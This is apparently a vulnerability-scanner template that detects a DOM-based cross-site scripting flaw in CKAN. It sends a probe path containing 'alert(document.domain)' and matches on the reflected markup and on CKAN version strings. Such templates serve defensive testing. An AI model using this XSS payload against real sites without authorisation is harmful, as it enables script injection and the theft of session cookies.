id: "ckan-dom-based-xss"
name: "CKAN - DOM Cross-Site Scripting"
severity: "high"
description: "CKAN contains a cross-site scripting vulnerability in the document object model via the previous version of the jQuery Sparkle library. An attacker can execute arbitrary script and thus steal cookie-based authentication credentials and launch other attacks."
tech:
  - "generic"
tags:
  - "dom"
  - "xss"
  - "vuln"
cwe: "CWE-79"
reference: "https://github.com/ckan/ckan/blob/b9e45e2723d4abd70fa72b16ec4a0bebc795c56b/ckan/public/base/javascript/view-filters.js#L27"
spaExclusion: true
request:
  method: "GET"
  path: "/?{alert(document.domain)}"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "word"
    part: "body"
    words:
      - "<option value=\"/en/?{alert(document.domain)}\" selected=\"selected\">"
  - type: "word"
    part: "body"
    words:
      - "ckan 2.3"
      - "ckan 2.8.2"
  - type: "word"
    part: "header"
    words:
      - "text/html"
  - type: "status"
    status:
      - 200
